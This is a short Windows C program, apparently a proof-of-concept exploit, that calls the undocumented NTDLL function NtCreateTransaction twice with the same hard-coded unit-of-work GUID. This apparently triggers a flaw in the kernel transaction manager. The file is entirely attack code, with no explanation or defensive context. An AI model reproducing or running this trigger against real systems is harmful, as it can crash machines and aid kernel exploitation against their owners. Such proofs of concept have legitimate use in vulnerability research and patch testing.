#define INITGUID
 
#include <windows.h>
#include <ktmw32.h>
 
#pragma comment(lib, "ktmw32")
 
DEFINE_GUID(Uow, 'AAAA', 'BB', 'CC', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K');
 
int main(int argc, char **argv)
{
    FARPROC NtCreateTransaction;
    HANDLE TransactionHandle;
 
    NtCreateTransaction = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateTransaction");
    TransactionHandle   = INVALID_HANDLE_VALUE;
    NtCreateTransaction(&TransactionHandle, TRANSACTION_ALL_ACCESS, NULL, &Uow, 0, 0, 0, 0, NULL, NULL);
    NtCreateTransaction(&TransactionHandle, TRANSACTION_ALL_ACCESS, NULL, &Uow, 0, 0, 0, 0, NULL, NULL);
    return;
}